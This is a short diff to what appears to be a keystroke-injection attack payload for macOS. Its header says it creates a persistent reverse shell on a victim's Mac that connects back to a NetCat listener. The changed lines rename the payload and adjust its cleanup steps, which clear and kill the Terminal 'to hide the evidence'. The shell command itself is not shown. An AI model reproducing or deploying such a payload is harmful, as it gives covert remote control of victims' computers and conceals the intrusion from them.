@@ -1,4 +1,4 @@
-# Title:         Reverse Bash Shell Mac
+# Title:         Mac Persistent Reverse Shell
 # Description:   Creates a persistent reverse shell on Mac victim that connects back to NetCat host
 # Author:        0dyss3us (KeenanV)
 # Props:
@@ -44,7 +44,7 @@ LED CLEANUP
 #Clears and kills the terminal to hide the evidence
 Q STRING clear
 Q ENTER
-DELAY 500
+Q DELAY 500
 Q STRING killall Terminal
 Q ENTER
 LED FINISH
